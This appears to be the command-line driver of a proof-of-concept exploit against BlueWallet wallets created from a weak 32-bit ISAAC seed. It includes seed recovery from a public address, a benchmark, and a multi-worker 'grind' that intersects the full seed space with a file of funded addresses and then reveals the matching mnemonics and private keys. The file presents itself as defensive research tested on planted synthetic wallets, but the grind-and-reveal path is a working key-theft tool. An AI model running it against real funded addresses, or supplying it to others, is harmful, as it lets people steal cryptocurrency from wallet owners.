#!/usr/bin/env python3
"""BlueWallet ISAAC CREATE — proof-of-concept demonstrator.

Subcommands:

  vectors    Reproduce the golden test vectors (determinism proof).
  wallet     Show the full CREATE output for a given ISAAC seed.
  recover    Pick a secret seed in a bounded range, then recover it from the
             public address alone (viability proof).
  benchmark  Measure enumeration throughput and extrapolate the full 2**32 cost.

This targets locally generated wallets against public historical source only.
It is for academic / defensive research; do not point it at real users' funds.
"""

from __future__ import annotations

import argparse
import random
import sys

import json
import os

from bluewallet_isaac import (
    bluewallet_v3_entropy_hex,
    create_hd_wallet,
    create_singlekey_wallet,
)
from bluewallet_isaac import attack
from bluewallet_isaac import grind as grind_mod

GOLDEN = {
    "seed1_hd_entropy": "2132c5907cbc79a7787eee988a67ef7342d7e4b4083faba7e1e468c92b4b0aa2",
    "seed42_hd_entropy": "a8553bdcb2bc20e74e0dbea6d8e73ed05302d4530183f2475a06d036248594ac",
    "seed1_singlekey_priv": "f7b794d0944c9fd8c8e1b50433ef38609fd0d46f9bc10badeaaada8fedb30646",
    "seed1_bip49_addr": "37D7efZUJ5S1BdiS63EKX4nAGbSJ1UpBYQ",
    "seed1_bip49_priv": "12df08697cbf22dc5f9b74801c7325ccb78cb18f0825029f44288c2f024ddc96",
    "seed1_segwit_p2sh_addr": "35mpjXaH4oRMAzSzbMRiNgjwmXtaSVMZA8",
}


def _check(label: str, got: str, expected: str) -> bool:
    ok = got == expected
    mark = "PASS" if ok else "FAIL"
    print(f"  [{mark}] {label}")
    print(f"         got={got}")
    if not ok:
        print(f"         exp={expected}")
    return ok


def cmd_vectors(_: argparse.Namespace) -> int:
    print("Golden vector reproduction (JS <-> Python parity):\n")
    hd1 = create_hd_wallet(1)
    sk1 = create_singlekey_wallet(1)
    ok = True
    ok &= _check("seed=1  HD entropy", bluewallet_v3_entropy_hex(1), GOLDEN["seed1_hd_entropy"])
    ok &= _check("seed=42 HD entropy", bluewallet_v3_entropy_hex(42), GOLDEN["seed42_hd_entropy"])
    ok &= _check("seed=1  HD BIP49 addr", hd1.bip49_address(0), GOLDEN["seed1_bip49_addr"])
    ok &= _check("seed=1  HD BIP49 priv", hd1.bip49_privkey_hex(0), GOLDEN["seed1_bip49_priv"])
    ok &= _check("seed=1  single-key priv", sk1.privkey_hex, GOLDEN["seed1_singlekey_priv"])
    ok &= _check("seed=1  single-key P2SH addr", sk1.segwit_p2sh_address(), GOLDEN["seed1_segwit_p2sh_addr"])
    print("\n  mnemonic(seed=1):", hd1.mnemonic)
    print("\nRESULT:", "ALL VECTORS PASS" if ok else "MISMATCH")
    return 0 if ok else 1


def cmd_wallet(args: argparse.Namespace) -> int:
    seed = args.seed
    hd = create_hd_wallet(seed)
    sk = create_singlekey_wallet(seed)
    print(f"ISAAC seed = {seed}\n")
    print("HD SegWit P2SH (BIP49, prefix 'hello there'):")
    print(f"  entropy    : {hd.entropy_hex}")
    print(f"  mnemonic   : {hd.mnemonic}")
    for i in range(args.gaps):
        print(f"  m/49'/0'/0'/0/{i}: addr={hd.bip49_address(i)}  priv={hd.bip49_privkey_hex(i)}")
    print("\nSingle-key (prefix 'oh hai!'):")
    print(f"  priv (hex) : {sk.privkey_hex}")
    print(f"  WIF        : {sk.wif}")
    print(f"  P2SH-P2WPKH: {sk.segwit_p2sh_address()}  (UI option #2, '3...')")
    print(f"  legacy P2PKH: {sk.legacy_address()}  ('1...', not offered in Era A UI)")
    return 0


def cmd_recover(args: argparse.Namespace) -> int:
    rng = random.Random(args.rng_seed)
    secret = rng.randrange(0, args.range)
    kind = args.kind
    gaps = args.gaps

    target_map = attack.addresses_for_seed(secret, kinds=(kind,), gaps=gaps)
    targets = set(target_map.values())

    print("Viability demo: recover an unknown seed from a public address alone.\n")
    print(f"  address kind      : {kind}")
    print(f"  secret seed range : [0, {args.range})  (bounded so the demo finishes quickly)")
    print(f"  target address(es): {sorted(targets)}")
    print("  (the recover() scan is given ONLY the address(es) above)\n")

    def progress(seed: int, secs: float) -> None:
        rate = seed / secs if secs else 0
        sys.stdout.write(f"\r  scanning... seed={seed:>10}  rate={rate:,.0f}/s")
        sys.stdout.flush()

    result = attack.recover_seed(
        targets,
        start=0,
        end=args.range,
        kinds=(kind,),
        gaps=gaps,
        progress_cb=progress,
        progress_every=5000,
    )
    print()
    if result.found:
        print(f"\n  RECOVERED seed = {result.seed}  (secret was {secret})")
        print(f"  matched {result.matched_kind} -> {result.matched_address}")
        print(f"  scanned {result.scanned:,} seeds in {result.seconds:.2f}s "
              f"({result.rate:,.0f} seeds/s)")
        assert result.seed == secret, "recovered seed must equal the secret"
        wallet = create_singlekey_wallet(result.seed) if kind != attack.KIND_BIP49 else create_hd_wallet(result.seed)
        secret_line = wallet.wif if kind != attack.KIND_BIP49 else wallet.mnemonic
        print(f"  -> full secret recovered: {secret_line}")
        return 0
    print("  NOT FOUND in range (increase --range).")
    return 1


def cmd_benchmark(args: argparse.Namespace) -> int:
    print(f"Throughput benchmark (single thread), kind={args.kind}, gaps={args.gaps}\n")
    b = attack.benchmark(kind=args.kind, seeds=args.seeds, gaps=args.gaps)
    print(f"  secp256k1 backend : {'coincurve (native)' if b.used_coincurve else 'ecdsa (pure python)'}")
    print(f"  measured          : {b.seeds:,} seeds in {b.seconds:.2f}s = {b.rate:,.0f} seeds/s")
    full = b.full_space_seconds()
    print(f"  full 2**32 (1 core): {attack.format_duration(full)}  ({full:,.0f}s)")
    for cores in (8, 64, 512):
        print(f"    with {cores:>4} cores : {attack.format_duration(full / cores)}")
    print("\n  Note: a real grinder intersects against a fixed funded-address set")
    print("  (one hashing pass, no per-candidate address lookup) and uses GPU /")
    print("  optimized libsecp; the lab writeup cites ~50-100k+ addr/s per host.")
    return 0


def cmd_grind(args: argparse.Namespace) -> int:
    funded = grind_mod.load_funded_set(args.funded)
    kinds = tuple(args.kinds.split(","))
    print("Full-space grind: intersect the ISAAC CREATE space with a funded set.\n")
    print(f"  funded set        : {args.funded}  ({len(funded):,} addresses)")
    print(f"  seed range        : [{args.start}, {args.end})")
    print(f"  kinds / gaps      : {kinds} / {args.gaps}")
    print(f"  workers           : {args.workers}\n")

    def progress(next_seed: int, secs: float, nhits: int) -> None:
        rate = next_seed / secs if secs else 0
        sys.stdout.write(f"\r  scanned up to seed={next_seed:>10}  hits={nhits}  rate={rate:,.0f}/s")
        sys.stdout.flush()

    report = grind_mod.grind(
        funded,
        start=args.start,
        end=args.end,
        kinds=kinds,
        gaps=args.gaps,
        workers=args.workers,
        chunk=args.chunk,
        out_dir=args.out_dir,
        resume=args.resume,
        progress_cb=progress,
    )
    print()
    print(f"\n  scanned {report.scanned:,} seeds in {report.seconds:.2f}s "
          f"({report.rate:,.0f} seeds/s)")
    print(f"  HITS: {len(report.hits)}")
    for h in report.hits:
        print(f"    seed={h.seed}  {h.kind}  {h.address}")

    if report.hits and args.reveal:
        print("\n  Reveal (self-owned synthetic hits — full compromise):")
        for h in report.hits:
            info = grind_mod.reveal_hit(h.seed, h.kind)
            secret = info.get("mnemonic") or info.get("wif")
            print(f"    seed={h.seed}  {h.kind}  {h.address}")
            print(f"      secret: {secret}")

    if args.expect_planted and os.path.exists(args.expect_planted):
        with open(args.expect_planted, "r", encoding="utf-8") as fh:
            truth = json.load(fh)
        planted = {g["seed"] for g in truth["planted"]}
        found = {h.seed for h in report.hits}
        missing = planted - found
        print(f"\n  planted seeds     : {sorted(planted)}")
        print(f"  recovered seeds   : {sorted(found)}")
        print(f"  RESULT: {'ALL PLANTED WALLETS LOCATED' if not missing else f'MISSING {sorted(missing)}'}")
        return 0 if not missing else 1
    return 0


def cmd_reveal(args: argparse.Namespace) -> int:
    info = grind_mod.reveal_hit(args.seed, args.kind)
    print(json.dumps(info, indent=2))
    return 0


def main(argv=None) -> int:
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="command", required=True)

    sp = sub.add_parser("vectors", help="reproduce golden test vectors")
    sp.set_defaults(func=cmd_vectors)

    sp = sub.add_parser("wallet", help="show CREATE output for a seed")
    sp.add_argument("seed", type=int)
    sp.add_argument("--gaps", type=int, default=3, help="BIP49 receive indices to show")
    sp.set_defaults(func=cmd_wallet)

    sp = sub.add_parser("recover", help="recover an unknown seed from an address")
    sp.add_argument("--kind", default=attack.KIND_SEGWIT_P2SH,
                    choices=[attack.KIND_BIP49, attack.KIND_SEGWIT_P2SH, attack.KIND_LEGACY])
    sp.add_argument("--range", type=int, default=100000,
                    help="secret seed is drawn from [0, range) and scanned")
    sp.add_argument("--gaps", type=int, default=1)
    sp.add_argument("--rng-seed", type=int, default=None,
                    help="seed the demo RNG for reproducibility")
    sp.set_defaults(func=cmd_recover)

    sp = sub.add_parser("benchmark", help="measure enumeration throughput")
    sp.add_argument("--kind", default=attack.KIND_SEGWIT_P2SH,
                    choices=[attack.KIND_BIP49, attack.KIND_SEGWIT_P2SH, attack.KIND_LEGACY])
    sp.add_argument("--seeds", type=int, default=5000)
    sp.add_argument("--gaps", type=int, default=1)
    sp.set_defaults(func=cmd_benchmark)

    sp = sub.add_parser("grind", help="intersect the seed space with a funded set")
    sp.add_argument("--funded", required=True, help="funded-address file (one per line)")
    sp.add_argument("--start", type=int, default=0)
    sp.add_argument("--end", type=int, default=300000,
                    help="exclusive upper seed bound (default demo range; use 4294967296 for full 2**32)")
    sp.add_argument("--kinds", default=f"{attack.KIND_BIP49},{attack.KIND_SEGWIT_P2SH}",
                    help="comma-separated address kinds")
    sp.add_argument("--gaps", type=int, default=2)
    sp.add_argument("--workers", type=int, default=1)
    sp.add_argument("--chunk", type=int, default=50000)
    sp.add_argument("--out-dir", default=None, help="checkpoint/hits directory (enables resume)")
    sp.add_argument("--resume", action="store_true")
    sp.add_argument("--reveal", action="store_true", help="reveal secrets for hits (self-owned demo only)")
    sp.add_argument("--expect-planted", default=None,
                    help="synthetic ground-truth JSON to verify all planted wallets were located")
    sp.set_defaults(func=cmd_grind)

    sp = sub.add_parser("reveal", help="reconstruct the secret for a (seed, kind) hit")
    sp.add_argument("seed", type=int)
    sp.add_argument("--kind", default="segwit_p2sh:0")
    sp.set_defaults(func=cmd_reveal)

    args = p.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    raise SystemExit(main())
